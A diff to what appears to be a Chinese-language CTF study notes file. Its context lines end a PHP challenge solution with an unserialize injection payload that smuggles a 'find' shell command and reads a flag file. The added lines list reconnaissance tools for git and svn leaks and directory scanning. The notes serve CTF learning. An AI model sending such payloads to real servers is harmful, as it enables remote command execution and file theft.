@@ -1050,3 +1050,10 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:33:"find / -name "*flag*" 2>/dev/null
 
 func=file_get_contents&p=/tmp/flagoefiu4r93
 ```
+
+# 从0到1：CTFer成长之路
+## 工具清单
+1. [scrabble](https://github.com/denny0223/scrabble) [GitHacker](https://github.com/WangYihang/GitHacker)
+2. [dvcs-ripper](https://github.com/kost/dvcs-ripper) [Seay-svn]
+3. [dirsearch](https://github.com/maurosoria/dirsearch) [Wappalyzer]
+## 1 
